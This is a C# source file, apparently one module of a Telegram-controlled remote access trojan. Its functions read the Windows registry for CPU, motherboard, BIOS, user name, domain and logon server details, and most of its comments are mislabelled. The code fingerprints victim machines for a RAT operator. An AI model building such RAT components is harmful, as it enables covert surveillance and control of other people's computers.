using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RAT_BotTelegram.Lib {
    internal sealed class Features {
        public static string getArchitecture () {
            // Obtiene la arquitecura del sistema operativo
            try {
                if (Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0").GetValue("Identifier").ToString().Contains("x86")) {
                    return "32 Bit";
                } else {
                    return "64 Bit";
                }
            } catch  {
                return "[-]";
            }
        }
        public static string getProcessorName() {
            // Obtiene Nombre del procesador
            try {
                return Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0").GetValue("ProcessorNameString").ToString();
            } catch {
                return "[-]";
            }
        }
        public static string getProcessorGhz() {
            // Obtiene Nombre del procesador
            try {
                return Registry.LocalMachine.OpenSubKey(@"HARDWARE\Description\System\CentralProcessor\0").GetValue("~MHz").ToString();
            } catch{
                return "[-]";
            }
        }
        public static string getMotherboardName() {
            // Obtiene Nombre del procesador
            try {
                return Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS").GetValue("SystemProductName").ToString();
            } catch {
                return "[-]";
            }
        }
        public static string getMotherboardManufacturer() {
            // Obtiene Nombre del procesador
            try {
                return Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS").GetValue("SystemManufacturer").ToString();
            } catch  {
                return "[-]";
            }
        }
        public static string getBIOSVendor() {
            // Obtiene Nombre del procesador
            try {
                return Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\BIOS").GetValue("BIOSVendor").ToString();
            } catch  {
                return "[-]";
            }
        }
        public static string getUserName() {
            // Obtiene Nombre del procesador
            try {
                return Registry.CurrentUser.OpenSubKey(@"Volatile Environment").GetValue("USERNAME").ToString();
            } catch{
                return "[-]";
            }
        }
        public static string getUserDomain() {
            // Obtiene Nombre del procesador
            try {
                return Registry.CurrentUser.OpenSubKey(@"Volatile Environment").GetValue("USERDOMAIN").ToString();
            } catch {
                return "[-]";
            }
        }

        public static string getLogonServer() {
            try {
                return Registry.CurrentUser.OpenSubKey(@"Volatile Environment").GetValue("LOGONSERVER").ToString();
            } catch {
                return "[-]";
            }
        }
    }
}

